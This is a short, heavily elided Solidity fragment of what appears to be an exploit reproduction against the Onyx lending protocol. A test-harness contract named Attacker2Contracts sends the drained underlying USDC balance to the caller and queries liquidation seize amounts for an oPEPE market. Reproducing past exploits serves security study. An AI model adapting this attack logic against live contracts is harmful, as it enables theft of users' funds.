...
contract Attacker2Contracts is TestHarness, TokenBalanceTracker {
    ...
    function start(ICERC20Delegator onyxToken) external {
        ...
        if (onyxToken.underlying() == address(USDC)) {
            ...
            IERC20(onyxToken.underlying())
                .transfer(msg.sender, IERC20(onyxToken.underlying()).balanceOf(address(this)));
        }
        ...
        (, uint256 numSeizeTokens) =
            Unitroller.liquidateCalculateSeizeTokens(address(onyxToken), address(oPEPE), 1);
